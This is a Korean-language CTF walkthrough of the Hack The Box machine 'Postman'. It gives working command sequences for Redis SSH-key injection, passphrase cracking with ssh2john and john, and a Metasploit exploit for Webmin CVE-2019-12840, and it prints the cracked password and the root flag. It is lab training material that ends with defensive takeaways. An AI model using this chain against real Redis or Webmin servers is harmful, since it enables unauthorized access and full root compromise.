# HTB — Postman

**OS:** Linux (Ubuntu 18.04.3) **Difficulty:** Easy **IP:** 10.129.2.1 **Tags:** `redis` `ssh-key-injection` `webmin` `CVE-2019-12840`

---

## Summary

Postman은 인증 없이 접근 가능한 Redis 서버를 악용해 SSH 공개키를 write하여 초기 접근을 달성하는 머신이다. 이후 서버에 남겨진 암호화된 RSA 백업 키를 john으로 크랙하고, Matt 유저가 동일 패스워드를 재사용한다는 점을 이용한다. 권한 상승은 Webmin 1.910의 인증된 RCE 취약점(CVE-2019-12840)을 통해 root를 획득한다.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 -T4 10.129.2.1
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt (Webmin)
```

### Service Version Scan

```bash
nmap -p 6379 -sV 10.129.2.1
```

```
6379/tcp open  redis  Redis key-value store 4.0.9
```

---

## Enumeration

### Redis (unauthenticated)

```bash
redis-cli -h 10.129.2.1
> CONFIG GET dir
# "/var/lib/redis"
```

Redis가 인증 없이 접근 가능하고 `CONFIG` 명령어를 허용한다 — SSH 키 write 공격 가능.

### Webmin

포트 10000에서 Webmin 1.910 실행 중. root 권한으로 동작.

---

## Exploitation

### Redis SSH Key Injection

Kali에서 SSH 키쌍 생성:

```bash
ssh-keygen -t rsa -f /tmp/redis_key
# passphrase 없이 Enter 두 번
```

Redis에 공개키 write:

```bash
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/pubkey.txt
redis-cli -h 10.129.2.1 FLUSHALL
cat /tmp/pubkey.txt | redis-cli -h 10.129.2.1 -x SET pubkey
redis-cli -h 10.129.2.1 CONFIG SET dir /var/lib/redis/.ssh
redis-cli -h 10.129.2.1 CONFIG SET dbfilename authorized_keys
redis-cli -h 10.129.2.1 BGSAVE
```

SSH 접속:

```bash
ssh -i /tmp/redis_key redis@10.129.2.1
# redis@Postman:~$
```

---

## Lateral Movement (redis → Matt)

### RSA 백업 키 발견

```bash
find / -name "*.bak" 2>/dev/null
# /opt/id_rsa.bak
```

### Passphrase 크랙

`/opt/id_rsa.bak` 내용을 Kali에 저장:

```bash
cat > /tmp/matt_key << 'EOF'
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
(... 키 내용 ...)
-----END RSA PRIVATE KEY-----
EOF
chmod 600 /tmp/matt_key
```

John으로 크랙:

```bash
ssh2john /tmp/matt_key > /tmp/matt_hash
john /tmp/matt_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
computer2008
```

### Matt 유저로 전환

SSH 직접 접속은 차단되어 있으므로 redis shell에서 su:

```bash
su Matt
# password: computer2008
```

---

## User Flag

```bash
cat /home/Matt/user.txt
```

---

## Privilege Escalation

### Webmin 1.910 RCE (CVE-2019-12840)

Matt의 패스워드(`computer2008`)로 Webmin 로그인 가능. Package Updates 기능에서 인증된 RCE 취약점 존재.

```bash
msfconsole
use exploit/linux/http/webmin_packageup_rce
set RHOSTS 10.129.2.1
set LHOST tun0
set USERNAME Matt
set PASSWORD computer2008
set SSL true
run
```

세션 획득 후:

```bash
id
# uid=0(root) gid=0(root)
```

---

## Root Flag

```bash
cat /root/root.txt
# ec2b190bd6a2dab3b975e47f68b246c8
```

---

## Attack Chain

```
Port Scan
  → Redis 6379 (unauthenticated)
    → SSH 공개키 write → redis 유저 SSH 접속
      → /opt/id_rsa.bak 발견
        → ssh2john + rockyou → computer2008
          → su Matt
            → Webmin 1.910 (CVE-2019-12840)
              → Metasploit RCE → root
```

---

## Key Takeaways

- **Redis 무인증 접근**: Redis가 인증 없이 외부에 노출되고 `CONFIG SET` 권한이 있으면 임의 파일 write가 가능하다. SSH authorized_keys 덮어쓰기로 OS 접근까지 이어진다.
- **패스워드 재사용**: 암호화된 SSH 키의 passphrase를 유저가 계정 패스워드로 재사용하는 것은 흔한 실수다.
- **Webmin CVE-2019-12840**: Package Updates 기능에서 업데이트 소스 URL에 명령어 삽입이 가능한 인증된 RCE. Webmin 1.910 이하 영향.